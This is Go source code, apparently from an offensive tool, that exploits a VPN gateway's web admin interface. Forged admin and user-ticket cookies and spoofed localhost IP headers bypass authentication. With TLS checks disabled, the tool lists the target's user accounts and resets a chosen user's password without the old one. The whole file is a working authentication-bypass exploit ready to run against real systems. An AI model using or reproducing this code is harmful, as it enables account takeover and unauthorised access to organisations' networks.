package module

import (
	"crypto/tls"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/go-resty/resty/v2"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func (v *vpnConnect) getUserList() {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"X-Forwarded-For": "127.0.0.1",
		"X-Originating":   "127.0.0.1",
		"X-Remote-IP":     "127.0.0.1",
		"X-Remote-Addr":   "127.0.0.1",
		"Refere":          v.target}
	headers["Cookie"] = "admin_id=1; gw_admin_ticket=1;"
	v.users = make([]string, 0)
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(v.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(v.timeout) * time.Second)
	log.SetPrefix("[*] ")
	log.Println("Try To Get Target's User List.")
	for i := 0; i < 6; i++ {
		resp, err := client.R().Get(fmt.Sprintf("%s%d", getUserListPath, i))
		if err != nil {
			log.SetPrefix("[-] ")
			log.Fatalln(err)
			os.Exit(0)
		}
		if !strings.Contains(string(resp.Body()), "用户信息") {
			log.SetPrefix("[-] ")
			log.Fatalln("target may secure.")
		}
		dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
		if err != nil {
			log.SetPrefix("[-] ")
			log.Fatalln(err)
		}
		dom.Find("#user_sel option").Each(
			func(i int, selection *goquery.Selection) {
				v.users = append(v.users, strings.Split(selection.Text(), "->")[1])
			})
	}
	if len(v.users) == 0 {
		log.SetPrefix("[-] ")
		log.Fatalln("get user failed,target may secure.")
		os.Exit(0)
	}
	log.SetPrefix("[*] ")
	log.Println("Target User List Got It.")
	v.canGetUser = true
	v.showUserList()
	log.Printf("Target Have %d User.\n", len(v.users))
}
func (v *vpnConnect) changePassword() {
	var index int
	fmt.Print("[!] Give A Num of User That You Want To Change Password:")
	fmt.Scanf("%d\n", &index)
	log.SetPrefix("[*] ")
	log.Printf("Trying To Change User %s's Password.", v.users[index])
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"Content-Type":    "application/x-www-form-urlencoded",
		"X-Forwarded-For": "127.0.0.1",
		"X-Originating":   "127.0.0.1",
		"X-Remote-IP":     "127.0.0.1",
		"X-Remote-Addr":   "127.0.0.1",
		"Referer":         fmt.Sprintf("%s/welcome.php", v.target),
		"Origin":          v.target,
	}
	headers["Cookie"] = fmt.Sprintf(`admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"%s","subAuthId":"1"}`, v.users[index])
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(v.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(v.timeout) * time.Second)
	body := fmt.Sprintf(`password=%s&repassword=%s&vcode=&old_pass=`, password, password)
	resp, err := client.R().SetBody(body).Post(changePasswordPath)
	if err != nil {
		log.SetPrefix("[-] ")
		log.Fatalln(err)
	}
	if resp.StatusCode() == http.StatusOK && strings.Contains(string(resp.Body()), "修改密码成功") {
		log.SetPrefix("[!] ")
		log.Printf("User %s's Password Change To %s", v.users[index], password)
	} else {
		log.SetPrefix("[!] ")
		dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
		if err != nil {
			log.SetPrefix("[-] ")
			log.Fatalln(err)
		}
		log.SetPrefix("[!] ")
		log.Fatalln(dom.Find(".main_font").Text())
	}
}
func (v *vpnConnect) Run() {
	v.init()
	v.getUserList()
	if v.change {
		v.changePassword()
	}
}
